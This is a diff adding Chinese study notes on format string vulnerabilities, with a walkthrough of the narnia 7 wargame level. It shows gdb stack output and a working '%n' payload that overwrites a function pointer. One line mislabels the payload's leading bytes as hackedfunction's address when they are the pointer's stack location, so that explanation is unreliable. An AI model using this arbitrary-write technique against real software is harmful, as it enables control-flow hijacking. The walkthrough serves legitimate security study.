@@ -191,3 +191,52 @@ printf("123%n", &x);
 ```
 x就变成了3（“123”的长度）
 利用这个specifier来写入进程里任意内存地址
+
+### format string vulnerability - 继续～
+
+[超级详细解释](https://cand-f18.unexploitable.systems/l/lab06/W6L2.pdf)
+
+- 进程内地址任意读写为任意值
+- 如果要写入的值太大就得分开两次写，具体看pdf
+
+
+
+#### narnia 7 
+
+```assembly
+在call snprintf下一指令处下一个断点，
+
+run $(python -c 'print "AAAA"')
+Starting program: /narnia/narnia7 $(python -c 'print "AAAA"')
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd618)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x080486b2 in vuln ()
+(gdb) x/20wx $esp
+0xffffd60c:	0xffffd61c	0x00000080	0xffffd889	0x080486ff
+0xffffd61c:	0x41414141	0x00000000	0x00000000	0x00000000
+0xffffd62c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd63c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd64c:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+由于x86通过压栈传参，esp后边三个0x00000080	0xffffd889	0x080486ff是snprintf的三个参数
+
+如果snprintf以为自己还有第四个参数第五个等等，它会从0x080486ff的位置拿。我想要它拿我自定的数据，而我可控制的buffer从0x41414141那里开始，他们中间相距一个word(0x080486ff)，那么就叫他跳过这个word(%x)，读下一个word。
+
+```
+run $(python -c 'print "\xf8\xd5\xff\xff\xfa\xd5\xff\xff"+"%34588x%2$n%32992x%3$n"')
+...
+...
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd5f8)
+I guess you want to come to the hackedfunction...
+```
+
+注意看argv[1]的开头，\xf8\xd5\xff\xff\xfa\xd5\xff\xff 是hackedfunction 地址的little endian版。后面的请看上面链接，这里再放一遍：[超级详细解释](https://cand-f18.unexploitable.systems/l/lab06/W6L2.pdf) 其中arbitrary write 那两页。
+
